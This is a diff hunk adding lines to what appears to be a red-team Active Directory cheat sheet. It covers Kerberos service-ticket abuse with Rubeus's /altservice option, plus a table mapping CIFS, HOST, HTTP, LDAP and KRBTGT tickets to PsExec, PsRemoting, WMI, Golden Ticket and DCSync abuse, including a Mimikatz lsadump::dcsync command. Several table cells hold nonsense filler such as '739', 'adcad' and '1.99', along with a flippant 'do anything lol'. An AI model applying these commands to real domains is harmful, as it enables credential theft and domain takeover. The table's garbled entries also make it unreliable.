@@ -170,6 +170,20 @@ klist
 ````
 
 <br>
+using */altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm* in Rubeus you can ask for all the tickets
+<br>
+| Service Ticket   | Service Type | # Abuse funtino |
+|--------------|:-----:|-----------:|
+| CIFS         |Windows FileShare, PsExec |        739 |
+| HOST         |PsRemoting, Scheduled Task | adcad |
+| HTTP         |PsRemoting|$sess = New-PsSession -Computername DC01; Enter-PsSession -Session $sess |
+| LDAP         |LDAP Ops, DCSync |Mimikatz > lsadump::dcsync /rat.local:$DC-IP /all /csv |
+| RPCSS        |  1.99 |        739 |
+| KRBTGT       |Golden Ticket |do anything lol,|
+
+| HOST & RPCSS |WMI |  WMIEXEC|
+| HOST & HTTP |WinRM |  WMIEXEC|
+
 <br>
 ## RTF && SCF Weaponization
 
